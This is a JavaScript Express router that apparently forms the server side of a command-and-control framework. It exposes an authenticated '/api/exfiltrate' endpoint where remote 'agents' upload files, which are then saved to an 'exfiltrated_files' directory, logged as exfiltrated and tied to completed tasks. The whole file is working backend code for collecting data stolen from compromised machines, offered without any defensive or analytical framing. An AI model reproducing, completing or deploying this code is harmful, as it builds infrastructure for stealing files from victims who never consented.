const express = require('express');
const router = express.Router();
const path = require('path');
const fs = require('fs');
const { verifyAgentKey } = require('../middleware/agentAuth');
const Result = require('../models/result');
const Task = require('../models/task');

const EXFIL_DIR = path.join(__dirname, '../../exfiltrated_files');

// Ensure directory exists
if (!fs.existsSync(EXFIL_DIR)) {
  fs.mkdirSync(EXFIL_DIR, { recursive: true });
}

/**
 * POST /api/exfiltrate/:agentId/:taskId/:filename
 * Agent uploads a file directly
 * Auth: Agent API key
 */
router.post('/:agentId/:taskId/:filename', verifyAgentKey, (req, res) => {
  try {
    const { agentId, taskId, filename } = req.params;
    
    // Validate agent ID matches
    if (agentId !== req.agentId) {
      return res.status(403).json({ error: 'Agent ID mismatch' });
    }

    const agentDir = path.join(EXFIL_DIR, agentId);
    if (!fs.existsSync(agentDir)) {
      fs.mkdirSync(agentDir, { recursive: true });
    }

    // Sanitize filename
    const safeFilename = filename.replace(/[^a-z0-9._-]/gi, '_');
    const filePath = path.join(agentDir, `${Date.now()}_${safeFilename}`);
    
    const writeStream = fs.createWriteStream(filePath);
    
    req.pipe(writeStream);
    
    writeStream.on('finish', () => {
      // Store a result entry so the user knows the file is here
      const result = Result.create({
        task_id: taskId,
        agent_id: agentId,
        output: `FILE_EXFILTRATED:${filePath}`,
        status: 'success'
      });

      // Complete the task
      Task.complete(taskId);

      console.log(`[EXFIL] File exfiltrated from ${agentId.slice(0, 8)}... -> ${safeFilename}`);
      res.json({ ok: true, path: filePath });
    });

    writeStream.on('error', (err) => {
      console.error('[EXFIL] Write error:', err);
      res.status(500).json({ error: 'File write failed' });
    });

  } catch (err) {
    console.error('[EXFIL] Error:', err.message);
    res.status(500).json({ error: 'Exfiltration failed' });
  }
});

module.exports = router;
